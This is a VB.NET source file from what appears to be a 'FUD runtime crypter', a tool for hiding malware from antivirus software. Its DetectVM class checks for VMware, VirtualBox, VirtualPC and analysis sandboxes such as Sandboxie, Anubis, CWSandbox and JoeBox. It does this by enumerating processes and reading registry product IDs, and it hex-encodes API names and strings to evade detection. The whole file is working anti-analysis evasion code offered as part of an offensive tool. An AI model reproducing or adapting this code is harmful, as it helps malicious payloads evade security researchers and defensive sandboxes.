'=============================================================================
'                  Crypter.NET - FUD Runtime crypter 
'                 Copyright (C) 2010 fLaSh - Carlos.DF 
'                        <c4rl0s.pt@gmail.com> 
'                     <http://www.flash1337.com/>
' THIS SOFTWARE IS PROVIDED BY THE AUTHORS ``AS IS'' AND ANY EXPRESS OR
' IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
' OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
' IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY DIRECT, INDIRECT,
' INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
' NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
' DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
' THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
' (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
' THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
'=============================================================================
Imports System
Imports System.Runtime.InteropServices
Imports System.Diagnostics
Imports Microsoft.Win32
Imports Microsoft.Win32.SafeHandles
Imports System.Security.Permissions
Imports System.Runtime.ConstrainedExecution
Public Class DetectVM
    Inherits NativeDllCalls

    'Detect 5 Different Sandboxes:
    '   -> Sandboxie : http://www.sandboxie.com/
    '   -> ThreatExpert : http://www.threatexpert.com/
    '   -> Anubis : http://anubis.iseclab.org/
    '   -> CWSandbox : http://www.cwsandbox.org/
    '   -> JoeBox : http://www.joebox.org/
    '
    'Inner enum used only internally
    <Flags()> _
    Private Enum SnapshotFlags As Int32
        HeapList = &H1
        Process = &H2
        Thread = &H4
        [Module] = &H8
        Module32 = &H10
        Inherit = &H80000000
        All = &H1F
    End Enum

    Public Enum MyProcessEx As Byte
        NORMAL = 0
        VIRTUAL = 1
        VMWARE = 2
        Sandboxie = 3
        ThreatExpert = 4
        VBOX = 5
        Anubis = 6
        CWSandbox = 7
        JoeBox = 8
    End Enum

    'Inner struct used only internally
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Auto)> _
    Private Structure PROCESSENTRY32
        Const MAX_PATH As Integer = 260
        Friend dwSize As UInt32
        Friend cntUsage As UInt32
        Friend th32ProcessID As UInt32
        Friend th32DefaultHeapID As IntPtr
        Friend th32ModuleID As UInt32
        Friend cntThreads As UInt32
        Friend th32ParentProcessID As UInt32
        Friend pcPriClassBase As Int32
        Friend dwFlags As UInt32
        <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=MAX_PATH)> _
        Friend szExeFile As String
    End Structure

    Private Const KERNEL32 As String = "kernel32"
    Private Const KERNEL32HEX As String = "0x6b65726e656c3332"

    '<DllImport("kernel32", SetLastError:=True, CharSet:=System.Runtime.InteropServices.CharSet.Auto)> _
    'Private Function CreateToolhelp32Snapshot(<[In]()> ByVal dwFlags As UInt32, <[In]()> ByVal th32ProcessID As UInt32) As IntPtr
    'End Function
    Private Delegate Function CreateToolhelp32Snapshot _
                (<[In]()> ByVal dwFlags As UInt32, _
                 <[In]()> ByVal th32ProcessID As UInt32) As IntPtr

    '<DllImport("kernel32", SetLastError:=True, CharSet:=System.Runtime.InteropServices.CharSet.Auto)> _
    'Private Function Process32First(<[In]()> ByVal hSnapshot As IntPtr, ByRef lppe As PROCESSENTRY32) As Boolean
    'End Function
    Private Delegate Function Process32First _
                (<[In]()> ByVal hSnapshot As IntPtr, _
                 ByRef lppe As PROCESSENTRY32) As Boolean

    '<DllImport("kernel32", SetLastError:=True, CharSet:=System.Runtime.InteropServices.CharSet.Auto)> _
    'Private Function Process32Next(<[In]()> ByVal hSnapshot As IntPtr, ByRef lppe As PROCESSENTRY32) As Boolean
    'End Function
    Private Delegate Function Process32Next _
                (<[In]()> ByVal hSnapshot As IntPtr, _
                 ByRef lppe As PROCESSENTRY32) As Boolean

    Private Const SBIEDLLHEX As String = "0x73626965646c6c2e646c6c"
    Private Const DBGHELPHEX As String = "0x64626768656c702e646c6c"

    Private Const VIRTUAL As String = "0x2a5649525455414c2a"
    Private Const VMWARE As String = "0x2a564d574152452a"
    Private Const VBOX As String = "0x2a56424f582a"

    Private Const PCPKEY As String = "0x53595354454d5c436f6e74726f6c5365743030315c53657276696365735c4469736b5c456e756d"
    Private Const SDBKEY As String = "0x536f6674776172655c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e"

    Private Const SDBKEYVALUE1 As String = "0x37363438372d3333372d383432393935352d3232363134"
    Private Const SDBKEYVALUE2 As String = "0x37363438372d3634342d333137373033372d3233353130"
    Private Const SDBKEYVALUE3 As String = "0x35353237342d3634302d323637333036342d3233393530"

    ' Get the parent process given a pid
    Private Function GetParentProcess(ByVal pid As Integer) As Process

        Dim parentProc As Process = Nothing
        Try
            Dim procEntry As New PROCESSENTRY32()
            procEntry.dwSize = CType(Marshal.SizeOf(GetType(PROCESSENTRY32)), UInt32)

            Dim oCreateToolhelp32Snapshot As CreateToolhelp32Snapshot = DirectCast( _
                        MyBase.DynamicCall(KERNEL32HEX, "0x437265617465546f6f6c68656c703332536e617073686f74", GetType(CreateToolhelp32Snapshot)),  _
                                    CreateToolhelp32Snapshot)

            Dim handleToSnapshot As IntPtr = oCreateToolhelp32Snapshot.Invoke(CUInt(SnapshotFlags.Process), 0)

            Dim oProcess32First As Process32First = DirectCast( _
                        MyBase.DynamicCall(KERNEL32HEX, "0x50726f6365737333324669727374", GetType(Process32First)),  _
                                    Process32First)

            If oProcess32First.Invoke(handleToSnapshot, procEntry) Then

                Dim oProcess32Next As Process32Next = DirectCast( _
                            MyBase.DynamicCall(KERNEL32HEX, "0x50726f6365737333324e657874", GetType(Process32Next)),  _
                                        Process32Next)
                Do
                    If pid = procEntry.th32ProcessID Then
                        parentProc = Process.GetProcessById(CInt(procEntry.th32ParentProcessID))
                        Exit Do
                    End If
                Loop While oProcess32Next.Invoke(handleToSnapshot, procEntry)
            Else
                Throw New ApplicationException(String.Format("Failed with win32 error code {0}", Marshal.GetLastWin32Error()))
            End If
        Catch ex As Exception
            Throw New ApplicationException("Can't get the process.", ex)
        End Try
        Return parentProc
    End Function

    ' Get the specific parent process
    Private ReadOnly Property CurrentParentProcess() As Process
        Get
            Return GetParentProcess(Process.GetCurrentProcess().Id)
        End Get
    End Property

    Private Function IsVirtualPCPresent() As MyProcessEx
        Dim oKey As RegistryKey = Registry.ClassesRoot.OpenSubKey(HexToString(PCPKEY), False)
        If oKey IsNot Nothing Then
            Dim sBuffer As String = oKey.GetValue("0").ToString.ToLower
            Select Case True
                Case sBuffer.Contains(HexToString(VIRTUAL)) : Return MyProcessEx.VIRTUAL
                Case sBuffer.Contains(HexToString(VMWARE)) : Return MyProcessEx.VMWARE
                Case sBuffer.Contains(HexToString(VBOX)) : Return MyProcessEx.VBOX
            End Select
        End If
        Return MyProcessEx.NORMAL
    End Function

    Private Function IsInSandbox() As MyProcessEx

        Dim parentProc As Process = Nothing
        Try

            Dim procEntry As New PROCESSENTRY32()
            procEntry.dwSize = CType(Marshal.SizeOf(GetType(PROCESSENTRY32)), UInt32)

            Dim oCreateToolhelp32Snapshot As CreateToolhelp32Snapshot = DirectCast( _
                    MyBase.DynamicCall(KERNEL32HEX, "0x437265617465546f6f6c68656c703332536e617073686f74", GetType(CreateToolhelp32Snapshot)),  _
                                CreateToolhelp32Snapshot)

            Dim handleToSnapshot As IntPtr = oCreateToolhelp32Snapshot.Invoke(CUInt(SnapshotFlags.Process), 0)

            Dim oProcess32First As Process32First = DirectCast( _
                        MyBase.DynamicCall(KERNEL32HEX, "0x50726f6365737333324669727374", GetType(Process32First)),  _
                                    Process32First)

            If oProcess32First.Invoke(handleToSnapshot, procEntry) Then

                Dim oProcess32Next As Process32Next = DirectCast( _
                            MyBase.DynamicCall(KERNEL32HEX, "0x50726f6365737333324e657874", GetType(Process32Next)),  _
                                Process32Next)
                Do
                    If procEntry.szExeFile.Contains(HexToString(SBIEDLLHEX)) Then
                        Return MyProcessEx.Sandboxie
                    ElseIf procEntry.szExeFile.Contains(HexToString(DBGHELPHEX)) Then
                        Return MyProcessEx.ThreatExpert
                    End If
                Loop While oProcess32Next.Invoke(handleToSnapshot, procEntry)
            Else
                Throw New ApplicationException(String.Format("Failed with win32 error code {0}", Marshal.GetLastWin32Error()))
            End If

        Catch ex As Exception
            Throw New ApplicationException("Can't get the process.", ex)
        End Try

        Try

            Dim oKey As RegistryKey = Registry.LocalMachine.OpenSubKey(HexToString(SDBKEY), False)
            If oKey IsNot Nothing Then
                Dim sBuffer As String = oKey.GetValue("ProductId").ToString.ToLower
                Select Case True
                    Case sBuffer.Contains(HexToString(SDBKEYVALUE1)) : Return MyProcessEx.Anubis
                    Case sBuffer.Contains(HexToString(SDBKEYVALUE2)) : Return MyProcessEx.CWSandbox
                    Case sBuffer.Contains(HexToString(SDBKEYVALUE3)) : Return MyProcessEx.JoeBox
                End Select
            End If

        Catch ex As Exception
            Throw ex
        End Try

    End Function

    Public Function CheckMyProcess() As MyProcessEx
        Dim oProcess As MyProcessEx

        'Check for virtual machine
        oProcess = IsVirtualPCPresent()
        If Not oProcess = MyProcessEx.NORMAL Then
            Return oProcess
        End If

        'Check for Sandbox
        oProcess = IsInSandbox()
        If Not oProcess = MyProcessEx.NORMAL Then
            Return oProcess
        End If

        Return MyProcessEx.NORMAL

    End Function

End Class